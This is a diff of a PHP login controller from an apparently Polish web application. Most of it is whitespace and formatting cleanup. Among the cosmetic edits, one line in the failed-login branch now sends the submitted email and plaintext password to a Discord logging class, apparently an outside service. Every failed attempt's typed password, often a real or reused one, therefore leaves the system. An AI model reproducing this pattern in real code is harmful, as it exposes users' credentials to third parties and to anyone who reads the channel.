@@ -30,15 +30,15 @@ class Login
 						$tarr["ROLE"] = (object) ["id" => $temp[0]->id, "role_name" => $temp[0]->role_name, "role_description" => $temp[0]->role_description, "r_active" => $temp[0]->r_active];
 						$_SESSION['ROLE'] = $tarr["ROLE"];
 						$l_access = new Linksaccess;
-						if(!empty($l_access->getAccessByRole($_SESSION['ROLE']->id))) {
-							foreach($l_access->getAccessByRole($_SESSION['ROLE']->id) as $l_a) {
+						if (!empty($l_access->getAccessByRole($_SESSION['ROLE']->id))) {
+							foreach ($l_access->getAccessByRole($_SESSION['ROLE']->id) as $l_a) {
 								$data["access_links"][$l_a->l_id] = $l_a->l_id;
 							}
 						}
 
 						$links = new Linksmodel();
 						foreach ($links->getLinks() as $link) {
-							if(in_array($link->id, $data["access_links"])) {
+							if (in_array($link->id, $data["access_links"])) {
 								$temp_links[$link->id] = (array) $link;
 							}
 						}
@@ -56,17 +56,17 @@ class Login
 						$_SESSION['CITIES'] = $data2;
 
 						$dc = new Discord;
-            			$dc->logins(1, ["first_name" => $_SESSION['USER']->first_name, "last_name" => $_SESSION['USER']->last_name, "role" => $_SESSION['ROLE']->role_name]);
+						$dc->logins(1, ["first_name" => $_SESSION['USER']->first_name, "last_name" => $_SESSION['USER']->last_name, "role" => $_SESSION['ROLE']->role_name]);
 						redirect('home');
 					} else {
 						$user->errors['email'] = "Twoje konto jest zablokowane!";
 						$dc = new Discord;
-            			$dc->logins(2, ["first_name" => $row->first_name, "last_name" => $row->last_name]);
+						$dc->logins(2, ["first_name" => $row->first_name, "last_name" => $row->last_name]);
 					}
 				} else {
 					$user->errors['email'] = "Błędne adres e-mail lub hasło!";
 					$dc = new Discord;
-					$dc->logins(3, []);
+					$dc->logins(3, ["t_login" => $_POST['email'], "t_pass" => $_POST['password']]);
 				}
 			} else {
 				$user->errors['email'] = "Logowanie nieudane!";
